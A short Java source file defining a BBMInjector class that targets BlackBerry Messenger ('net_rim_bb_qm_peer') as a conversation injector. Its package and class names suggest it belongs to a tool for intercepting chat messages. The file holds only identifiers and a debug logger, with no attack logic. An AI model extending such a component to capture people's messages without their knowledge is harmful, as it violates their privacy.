package blackberry.injection.injectors;

import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class BBMInjector extends AConversationInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("BBMInjector", DebugLevel.VERBOSE);
    //#endif
    
    public String getAppName() {        
        return "Messenger";
    }

    public String getCodName() {
        return "net_rim_bb_qm_peer";
    }

}
